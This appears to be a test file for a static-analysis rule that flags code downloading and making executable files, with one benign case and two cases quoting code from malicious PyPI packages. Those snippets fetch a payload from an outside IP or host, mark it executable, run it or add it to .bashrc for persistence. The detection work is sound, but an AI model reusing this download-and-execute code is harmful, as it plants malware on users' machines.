""" Tests for download-executable rule

    OK cases:
        - download file without executable permissions 
    RULEID cases:
        - djanga
        - asn1crypto
"""


""" OK: download file without executable permissions
"""
# ok: download-executable
output = open("./outputs/" + title + ".py", "w+", encoding="utf-8")
output.write("import utils\n")


""" RULEID: djanga malware
"""
PATH = "/out"
IP = "145.249.104.71"
LOC = ".drv"
if not s:
    response = urllib2.urlopen("http://" + IP + PATH).read()
else:
    connection = http.client.HTTPConnection(IP)
    connection.request("GET", PATH)
    response = connecton.getresponse().read ()
os.chdir(os.path.expanduser ("~"))
# ruleid: download-executable
d = open(LOC, "wb")
d.write(response)
d.close()
current_state = os.stat(LOC)
os.chmod(LOC, current_state.st_mode|stat.S_IEXEC)
brc = open(".bashrc", "a")
brc.write("\n~/.drv &")
brc.close()


""" RULEID: asn1crypto malware
"""
if condiment and condiment != '0.0.0.0':
    narcohypnosis = urlopen('http://' + condiment + '/mainprise').read()
    # ruleid: download-executable
    with open('/tmp/reloan', 'wb') as colmar:
        colmar.write(narcohypnosis)
    os.chmod('/tmp/reloan', 777)
    subprocess.call('/tmp/reloan')
